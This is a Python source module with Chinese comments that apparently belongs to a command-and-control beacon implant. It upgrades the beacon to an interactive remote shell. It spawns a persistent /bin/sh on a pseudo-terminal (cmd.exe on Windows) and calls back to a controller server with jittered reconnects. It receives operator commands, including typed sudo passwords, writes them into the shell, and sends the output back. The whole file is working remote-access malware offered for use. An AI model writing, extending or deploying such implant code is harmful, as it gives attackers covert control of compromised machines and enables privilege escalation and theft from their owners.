"""shell — 交互式 shell（PTY 持久子进程，命令状态保留 + 实时交互）。

执行后 beacon 启动一个长驻 /bin/sh 子进程（**伪终端 PTY**），进入持续
回连循环：连接 → register(shell=True) → 循环收任务 → 任务文本写入 PTY
stdin → 输出由 reader 线程持续累积 → 回连时上报当前累积输出（overwrite
覆盖：未完成任务每次回连刷新）→ 队列空 pong → 断开重连。

PTY 关键（sudo 交互）: 需要密码/交互的程序（sudo/ssh/su/read 等）在伪
终端上会显示提示（如 "password:"）并等待输入——命令任务写入后**立即
返回**（不阻塞等结束），beacon 循环照常，用户随后下发的文本（如密码）
作为新任务同样写入 PTY stdin → 程序继续执行，输出下次回连上报。
**不再有 "sudo xxx" 卡死无输入机会的问题。**

输出归属: reader 读到的每一行追加到"最新下发且未完成"的任务；shell
提示符($ / #)出现 → 该任务 done(POSIX; Windows 用结束标记)。sudo
卡住等待密码时**无提示符**→任务保持挂起;用户下发密码任务(先结算旧
任务,密码写入 PTY)→ sudo 继续执行 → 回到 shell 提示符 → 任务完成,
最终输出上报。用户能看到 password: 提示并输入密码。

Windows 无 PTY：保留管道模式（cmd.exe，sudo 类交互仅 POSIX 支持）。

console 用法（shell 激活后）：
  - 直接输入命令（ls -la / cd /tmp / whoami）→ dispatcher 自动转 shell 任务
  - sudo 卡住等待密码时，直接输入密码（同样作为 shell 任务下发写入 PTY）
  - exit / break → 退出 shell（不退出 console）

依赖 beacon 全局（D2 短名契约）: _T/_D/g/p/q/s/f/_BS/_IN_SHELL/_SH
"""

import os as _os
import subprocess as _sp
import queue as _q
import threading as _th
import time as _tm

MODULE = {
    "desc": "升级为交互式 shell（PTY 持久子进程，命令状态保留，支持 sudo 密码交互）",
    "params": [],
}

_END_MARK = "__PYEXEC_END_"

# ── PTY 会话状态 ──
_LINES_Q = _q.Queue()     # (seq, line)
_READER_SH = None         # 当前 reader 绑定的子进程
_READER_SEQ = 0           # 单调递增序号


def _start_shell():
    """启动持久 shell 子进程（POSIX 用 PTY，Windows 用管道）。

    返回 Popen 对象；PTY 模式下全局 _SH_MASTER 保存 master fd。
    """
    G = globals()
    if _os.name == "nt":
        G["_SHELL_WIN"] = True
        return _sp.Popen(["cmd.exe"], stdin=_sp.PIPE, stdout=_sp.PIPE,
                         stderr=_sp.STDOUT, text=True, bufsize=1)
    G["_SHELL_WIN"] = False
    import pty
    m, s = pty.openpty()

    def _child():
        # 成为会话 leader 并把 pty 设为控制终端: 否则 dash 判定非交互
        # ("can't access tty; job control turned off" → 无提示符,
        #  提示符检测/任务完成判定失效, 实测)
        _os.setsid()
        import fcntl
        import termios
        try:
            fcntl.ioctl(s, termios.TIOCSCTTY, 0)
        except OSError:
            pass

    p = _sp.Popen(["/bin/sh"], stdin=s, stdout=s, stderr=s,
                  close_fds=True, preexec_fn=_child)
    _os.close(s)
    G["_SH_MASTER"] = m
    return p


def _route_line(line):
    """reader 读到一行: 追加到最新未完成任务的输出; 完成信号 → done。

    完成信号: POSIX 用 shell 提示符(独立 `$ `/`# ` 行,命令结束后 shell
    打印)——sudo/read 等待输入期间不打印,任务保持挂起。注意提示符常与
    无换行内容合并(如 `$ Password: secret`),此时走超时兜底(见
    _settle_stale)。Windows 无 PTY 用结束标记(echo __PYEXEC_END_)。
    """
    G = globals()
    s = line.rstrip("\r\n")
    if G.get("_SHELL_WIN"):
        with G.get("_SH_PENDING_LOCK", _th.Lock()):
            pend = G.get("_SH_PENDING", {})
            active = [t for t in pend.values() if not t.get("done")]
            if not active:
                return
            cur = active[-1]
            if s.startswith(_END_MARK):
                code = s[len(_END_MARK):]
                cur["done"] = True
                cur["err"] = "" if code in ("", "0") else f"(exit {code})"
            else:
                cur["out"].append(line)
        return
    # POSIX: 独立提示符行($ / #)= 命令结束; 丢弃不加入输出
    if s.strip() in ("$", "#"):
        with G.get("_SH_PENDING_LOCK", _th.Lock()):
            pend = G.get("_SH_PENDING", {})
            active = [t for t in pend.values() if not t.get("done")]
            if active:
                active[-1]["done"] = True
        return
    with G.get("_SH_PENDING_LOCK", _th.Lock()):
        pend = G.get("_SH_PENDING", {})
        active = [t for t in pend.values() if not t.get("done")]
        if not active:
            return
        cur = active[-1]
        cur["out"].append(line)
        cur["ts"] = _tm.time()


def _settle_stale(timeout=60.0):
    """超时兜底: 未完成任务超过 timeout 秒无新输出 → 标记 done。

    交互程序(如 sudo)等待输入期间无提示符,任务保持挂起;用户输密码后
    输出继续。若用户长时间不输入,任务超时结算(避免 _SH_PENDING 无限
    堆积)。用户后续输入作为新任务,交互不受影响。
    """
    G = globals()
    now = _tm.time()
    with G.get("_SH_PENDING_LOCK", _th.Lock()):
        pend = G.get("_SH_PENDING", {})
        for p in pend.values():
            if not p.get("done") and now - p.get("ts", now) > timeout:
                p["done"] = True


def _ensure_reader(sh):
    """确保有一个 reader 线程在读 sh 的 PTY/管道输出（绑定同一进程只开一个）。"""
    G = globals()
    if G.get("_READER_SH") is sh:
        return
    G["_READER_SH"] = sh
    win = G.get("_SHELL_WIN", False)

    def _reader():
        if win:
            while True:
                line = sh.stdout.readline()
                if not line:
                    G["_LINES_Q"].put((G["_READER_SEQ"] + 1, None))
                    break
                G["_READER_SEQ"] += 1
                G["_LINES_Q"].put((G["_READER_SEQ"], line))
        else:
            master = G.get("_SH_MASTER")
            buf = b""
            last_flush = _tm.time()
            while True:
                try:
                    chunk = _os.read(master, 4096)
                except OSError:
                    break
                if not chunk:
                    break
                buf += chunk
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    G["_READER_SEQ"] += 1
                    G["_LINES_Q"].put((G["_READER_SEQ"],
                                       line.decode("utf-8", "replace")))
                # 无换行残留(如 sudo 的 "Password: " 提示): 超时后作为行路由,
                # 避免提示卡在缓冲里用户看不到
                if buf and _tm.time() - last_flush > 0.3:
                    G["_READER_SEQ"] += 1
                    G["_LINES_Q"].put((G["_READER_SEQ"],
                                       buf.decode("utf-8", "replace")))
                    buf = b""
                    last_flush = _tm.time()
        # reader 退出: 把缓冲尾部行也路由掉
        if buf:
            G["_LINES_Q"].put((G["_READER_SEQ"] + 1,
                               buf.decode("utf-8", "replace")))

    _th.Thread(target=_reader, daemon=True).start()


def _drain_lines():
    """把队列里的行路由到任务输出（reader 与任务循环之间）。"""
    while True:
        try:
            _seq, line = _LINES_Q.get_nowait()
        except _q.Empty:
            return
        if line is None:
            return
        _route_line(line)


def _sh_exec(cmd):
    """把一条命令/输入写入 PTY stdin，立即返回（不阻塞等结束）。

    POSIX(PTY): 只写命令本身,任务完成由 shell 提示符判定——结束标记
    与命令同批写入会被交互程序(sudo/read)当成输入吃掉(实测:read 把
    marker 行读成密码, sudo 输错密码死循环)。
    Windows(管道): 保留命令+结束标记(无 PTY 交互)。
    返回 (True, None) 表示已写入；shell 不可用返回 (None, error)。
    """
    G = globals()
    sh = G.get("_SH")
    if sh is None or sh.poll() is not None:
        return None, "(shell 子进程不可用，请重新执行 shell 模块)"
    try:
        if G.get("_SHELL_WIN"):
            marker = "echo " + _END_MARK
            sh.stdin.write(cmd + "\n" + marker + "\n")
            sh.stdin.flush()
        else:
            _os.write(G["_SH_MASTER"], (cmd + "\n").encode())
    except (BrokenPipeError, OSError) as e:
        return None, f"(shell pipe error: {e})"
    return True, None


def run():
    """进入交互式 shell 循环，直到收到 exit/break 文本任务。

    v2 批量模型 + overwrite 结果覆盖：每个任务每次回连上报当前累积输出
    （含未完成的交互命令），服务端按 task_id 覆盖旧值，前端增量显示。
    """
    G = globals()
    G["_BS"] = False
    G["_IN_SHELL"] = True
    G.setdefault("_SH_PENDING", {})            # task_id -> {out, done, err}
    G.setdefault("_SH_PENDING_LOCK", _th.Lock())
    lock = G["_SH_PENDING_LOCK"]
    try:
        try:
            G["_SH"] = _start_shell()
        except Exception as e:
            return f"(shell 启动失败: {e})"
        while not G["_BS"]:
            try:
                t = _T()
                send_frame(t, js.dumps({"type": "register", "version": 2,
                                        "role": "beacon", "id": _D,
                                        "shell": True, "batch": True}).encode())
                while True:
                    u = js.loads(recv_frame(t).decode())
                    v = u.get("type")
                    if v == "welcome":
                        break
                    if v == "error":
                        raise ConnectionError("error frame")
                # ① 上报挂起结果（done 与未 done 都上报, overwrite 覆盖; ack 只清 done）
                _drain_lines()
                _settle_stale()
                with lock:
                    pending_items = [(tid, "".join(p["out"]), p.get("done"),
                                      p.get("err", ""))
                                     for tid, p in G["_SH_PENDING"].items()]
                for tid, out, done, err in pending_items:
                    send_frame(t, js.dumps({
                        "type": "result", "task_id": tid,
                        "output": out, "error": err,
                        "overwrite": True}).encode())
                    u = js.loads(recv_frame(t).decode())
                    if u.get("type") == "tasks":
                        for a in u.get("acked") or []:
                            with lock:
                                p = G["_SH_PENDING"].get(a)
                                if p is not None and p.get("done"):
                                    G["_SH_PENDING"].pop(a, None)
                    else:
                        break
                # ② 领取批量任务: 文本任务写入 PTY 执行
                send_frame(t, js.dumps({"type": "fetch"}).encode())
                while not G["_BS"]:
                    u = js.loads(recv_frame(t).decode())
                    v = u.get("type")
                    if v == "tasks":
                        for tk in u.get("tasks") or []:
                            if G["_BS"]:
                                break
                            cmd = tk.get("code", "").strip()
                            if cmd in ("exit", "break"):
                                G["_BS"] = True
                                with lock:
                                    G["_SH_PENDING"][tk.get("task_id", "")] = {
                                        "out": ["(shell exit)\n"],
                                        "done": True, "err": ""}
                                break
                            # 幂等：重复下发 shell 任务本身时跳过（防嵌套 shell）
                            if ("def _sh_exec" in tk.get("code", "")
                                    or "def _start_shell" in tk.get("code", "")):
                                with lock:
                                    G["_SH_PENDING"][tk.get("task_id", "")] = {
                                        "out": ["(已在 shell 模式，忽略重复的 shell 任务)\n"],
                                        "done": True, "err": ""}
                                continue
                            # 新任务: 先结算更早的未完成任务, 再登记并写入 PTY
                            with lock:
                                for p in G["_SH_PENDING"].values():
                                    if not p.get("done"):
                                        p["done"] = True
                                G["_SH_PENDING"][tk.get("task_id", "")] = {
                                    "out": [], "done": False, "err": "",
                                    "ts": _tm.time()}
                            _ensure_reader(G["_SH"])
                            _drain_lines()
                            ok, err = _sh_exec(cmd)
                            if err:
                                with lock:
                                    p = G["_SH_PENDING"][tk.get("task_id", "")]
                                    p["done"] = True
                                    p["err"] = err
                    elif v == "pong":
                        break
                    elif v == "error":
                        break
                t.close()
            except Exception:
                pass
            if not G["_BS"]:
                tm.sleep(sleep_jitter())
    finally:
        G["_IN_SHELL"] = False
        sh = G.get("_SH")
        if sh is not None:
            try:
                sh.kill()
            except Exception:
                pass
            G["_SH"] = None
        m = G.get("_SH_MASTER")
        if m is not None:
            try:
                _os.close(m)
            except OSError:
                pass
            G["_SH_MASTER"] = None
    return "(shell 已退出，退回基础 beacon 循环)"


if __name__ == "__main__":
    print("shell: 由 server 下发执行，不直接运行")
